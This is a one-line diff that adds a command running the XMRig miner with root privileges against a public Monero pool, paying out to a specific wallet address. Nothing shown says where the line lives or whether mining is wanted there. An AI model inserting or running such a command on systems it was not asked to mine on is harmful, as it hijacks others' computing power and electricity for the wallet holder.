@@ -1,0 +1,1 @@
+sudo ./xmrig -o pool.supportxmr.com:5555 -u 83EY9e9FDbeNVdAjUjfD4Sb9fqFy965hzPPK1oksp47R6T4LwWe1nJsPdaVgCrjmxiVt33jCLZ12SKXxDMD1VcUeNW2i4Nn --algo="rx/0" --coin="XMR" --pass="laptop"
